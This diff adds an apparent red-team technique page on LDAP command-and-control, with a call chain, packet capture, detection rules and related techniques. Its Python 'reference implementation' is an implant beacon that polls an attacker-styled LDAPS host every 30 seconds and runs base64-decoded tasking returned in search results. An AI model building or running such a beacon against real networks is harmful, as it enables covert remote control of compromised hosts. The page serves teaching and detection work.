@@ -1,0 +1,166 @@
+---
+title: LDAP C2
+mitre: T1071.004
+category: c2
+group: Covert Channels
+summary: Steer an implant over LDAP, using the directory protocol's bind and search operations as the beacon.
+platform: [Windows, Linux, macOS]
+tags: ['LDAP', 'C / C++', 'Kerberos']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: Bind to the LDAP endpoint
+    desc: The implant opens a TCP session to the C2 LDAP server on 389 or 636 and issues a bind.
+    dll: '-'
+  - call: Issue the beacon as a search
+    desc: A searchRequest filter or base carries the beacon identity and outstanding task count.
+    dll: '-'
+  - call: Server replies with tasking
+    desc: searchResultEntry attributes encode the command or file block to run.
+    dll: '-'
+  - call: Repeat on a schedule
+    desc: Each poll is another bind and search; the implant parses entries as any LDAP response.
+    dll: '-'
+detections:
+  - src: SYSMON EID 3
+    text: An outbound connection to 389 or 636 from a host that is not a domain controller.
+  - src: LDAP EID 4662
+    text: Repeated binds and searches against an external LDAP server at a fixed cadence.
+  - src: NETWORK
+    text: A single client issuing periodic searchRequest messages of constant size - a beacon.
+  - src: BEHAVIOURAL
+    text: LDAP filters or attribute sets that repeat with minor variation on a timer, outside real queries.
+related:
+  - mitre: T1071.004
+    title: DNS Beaconing
+    desc: The DNS sibling - encodes the beacon in labels instead of LDAP filters.
+    href: /techniques/c2/dns-beaconing
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: The plain-HTTP sibling; LDAP C2 is the same beacon pattern over the directory protocol.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1071.002
+    title: SMB Named Pipe
+    desc: Another AD-native channel; LDAP C2 rides the same outbound-allowed-to-DCs trust.
+    href: /techniques/c2/smb-named-pipe
+  - mitre: T1558.004
+    title: AS-REP Roasting
+    desc: AD recon that pairs with an LDAP C2 - the directory is both the channel and the target.
+    href: /techniques/credential-access/asrep-roasting
+labKit:
+  - label: LDAP C2 server + implant
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: Detonation VM profile
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+LDAP C2 turns the Lightweight Directory Access Protocol into a command-and-control channel. The
+implant opens a session to an attacker-controlled LDAP server on port 389 (plain) or 636 (LDAPS)
+and uses the protocol's own operations as its transport: a bind opens the channel, a search
+request carries the beacon, and the search result entries carry the tasking back. The implant
+treats the response exactly as it would treat any legitimate LDAP result, so the traffic looks
+like a directory client, not an implant.
+
+The reason this is attractive is that LDAP is rarely blocked. Outbound to a domain controller on
+389 is one of the most allowed flows in an Active Directory environment, and many egress policies
+permit it by default because the domain itself needs it. An implant that beacons to a
+domain-lookalike over 389 blends into the noise of every other machine talking to a DC. The same
+trust that makes the channel convenient is what the defender has to cut.
+
+<Callout type="note">
+  There are two flavours. The common one is a dedicated attacker LDAP server the implant binds to
+  - the whole tree is fake and every entry is a command. The advanced one rides a *real* DC's LDAP
+  port, hiding the beacon inside a legitimate-looking query to the actual directory. Both are the
+  same beacon pattern; only the endpoint differs.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The beacon rides in the search filter; the tasking comes back in the result attributes. The
+framing below shows both sides of one poll.
+
+<CodeBlock
+  file="ldap_c2.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`import ldap3, base64, time
+
+server = ldap3.Server('c2.corp-lookup.net', port=636, use_ssl=True)
+
+def poll(agent, task_id):
+    conn = ldap3.Connection(server, user='cn=agent', password='...')
+    conn.bind()
+    # the beacon payload rides in the filter: agent id + task counter
+    filter = f'(uid={agent}-{task_id})'
+    conn.search('dc=corp,dc=local', filter,
+                attributes=['userPassword', 'description'])
+    # the server packs the next command into a returned attribute
+    for e in conn.entries:
+        run_task(base64.b64decode(str(e.description)))
+    conn.unbind()
+
+task = 1
+while True:
+    poll('agent-7', task)   # each loop is one beacon over 636
+    task += 1
+    time.sleep(30)          # the beacon interval`}
+/>
+
+On the wire the defender sees a repeated `BindRequest` followed by a `SearchRequest` of roughly
+constant length, then a `SearchResultEntry` - the classic beacon signature, just in LDAP's BER
+encoding instead of DNS labels or an HTTP path.
+
+<Callout type="caution">
+  Plain LDAP on 389 is unencrypted, so the bind credentials and the encoded payload are readable
+  in cleartext. 636 / StartTLS hides them, but the *shape* of the traffic - periodic binds and
+  searches from one client - is detectable either way. Encryption protects the bytes, not the
+  cadence.
+</Callout>
+
+## Verifying in the lab
+
+Run the implant against the lab LDAP server and capture the channel. Wireshark shows the
+bind-then-search loop at a steady interval; the server's response entries carry the command back.
+
+<CodeBlock
+  file="tcpdump"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`$ tcpdump -i any -s0 -X port 636
+... BindRequest  cn=agent ...
+... SearchRequest  base=dc=corp,dc=local  filter=(uid=agent-7-42)
+... SearchResultEntry  description=base64:tasking ...
+    ^ the beacon and the tasking, one round trip  <-- the artifact`}
+/>
+
+## Detection
+
+The tell is a single client doing periodic LDAP operations that no real directory client would
+do at that cadence.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the EID 3 outbound-to-389 rule is the cheapest continuous control and immediately
+flags implants that bind to a non-DC LDAP server. The network cadence rule is the higher-fidelity
+catch for the "talking to a real-looking DC" case and needs flow correlation. The EID 4662 rule
+only fires where the endpoint is actually a DC that logs directory access.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
